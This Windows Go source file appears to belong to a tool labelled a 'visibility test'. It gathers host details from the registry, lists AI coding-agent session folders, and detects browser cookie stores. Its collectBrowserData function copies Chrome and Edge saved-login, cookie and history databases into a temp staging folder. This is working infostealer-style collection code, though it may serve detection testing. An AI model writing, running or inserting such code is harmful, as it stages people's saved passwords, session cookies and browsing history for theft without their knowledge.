//go:build windows

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"golang.org/x/sys/windows/registry"
)

// getHomeDir returns the home directory for the current platform
func getHomeDir() string {
	return os.Getenv("USERPROFILE")
}

// getAgentDirectories returns agent-specific paths for Windows
func getAgentDirectories() map[string]string {
	return map[string]string{
		"Claude":  `.claude\projects`,
		"Kiro":    `.kiro\sessions\cli`,
		"Cowork":  `AppData\Local\Packages\Claude_pzs8sxrjxfjjc\LocalCache\Roaming\Claude\local-agent-mode-sessions`,
	}
}

// collectSystemInfo gathers system information for Windows
func collectSystemInfo() SystemInfo {
	info := SystemInfo{}

	// Computer name
	if name, err := os.Hostname(); err == nil {
		info.ComputerName = name
	}

	// Username
	info.Username = os.Getenv("USERNAME")

	// OS Name from registry
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, registry.QUERY_VALUE)
	if err == nil {
		defer k.Close()
		if val, _, err := k.GetStringValue("ProductName"); err == nil {
			info.OSName = val
		}
		if val, _, err := k.GetStringValue("CurrentBuild"); err == nil {
			info.OSVersion = "Build " + val
		}
	}

	// CPU Name from registry
	k, err = registry.OpenKey(registry.LOCAL_MACHINE, `HARDWARE\DESCRIPTION\System\CentralProcessor\0`, registry.QUERY_VALUE)
	if err == nil {
		defer k.Close()
		if val, _, err := k.GetStringValue("ProcessorNameString"); err == nil {
			info.CPUName = strings.TrimSpace(val)
		}
	}

	// Memory - use syscall for memory info
	info.TotalMemory = "Unknown"

	// System uptime - use registry for uptime info
	info.SystemUptime = "Unknown"

	// Browser cookies detection
	info.BrowserCookies = detectBrowserCookies()

	return info
}

func detectBrowserCookies() string {
	home := os.Getenv("USERPROFILE")
	browsers := []string{}

	paths := map[string]string{
		"Chrome":  filepath.Join(home, `AppData\Local\Google\Chrome\User Data\Default\Network\Cookies`),
		"Edge":    filepath.Join(home, `AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies`),
		"Firefox": filepath.Join(home, `AppData\Roaming\Mozilla\Firefox\Profiles`),
	}

	for browser, path := range paths {
		if _, err := os.Stat(path); err == nil {
			browsers = append(browsers, browser)
		}
	}

	if len(browsers) > 0 {
		return "Detected: " + strings.Join(browsers, ", ")
	}
	return "None detected"
}

func collectBrowserData() {
	home := os.Getenv("USERPROFILE")
	tempDir := os.TempDir()
	stagingDir := filepath.Join(tempDir, "logs")

	os.MkdirAll(stagingDir, 0755)

	fmt.Printf("%s[INFO]%s Collecting browser data for visibility test...\n", ColorGreen, ColorReset)

	files := map[string]string{
		filepath.Join(home, `AppData\Local\Google\Chrome\User Data\Default\History`):          "chrome_history.db",
		filepath.Join(home, `AppData\Local\Google\Chrome\User Data\Default\Network\Cookies`):  "chrome_cookies.db",
		filepath.Join(home, `AppData\Local\Google\Chrome\User Data\Default\Login Data`):       "chrome_logins.db",
		filepath.Join(home, `AppData\Local\Microsoft\Edge\User Data\Default\History`):         "edge_history.db",
		filepath.Join(home, `AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies`): "edge_cookies.db",
	}

	collected := 0
	for src, dst := range files {
		if err := copyFile(src, filepath.Join(stagingDir, dst)); err == nil {
			fmt.Printf("%s[+]%s Collected: %s\n", ColorGreen, ColorReset, dst)
			collected++
		}
	}

	if collected > 0 {
		fmt.Printf("%s[SUCCESS]%s Collected %d browser data files\n", ColorGreen, ColorReset, collected)
	} else {
		fmt.Printf("%s[WARN]%s No browser data files collected\n", ColorYellow, ColorReset)
	}
}
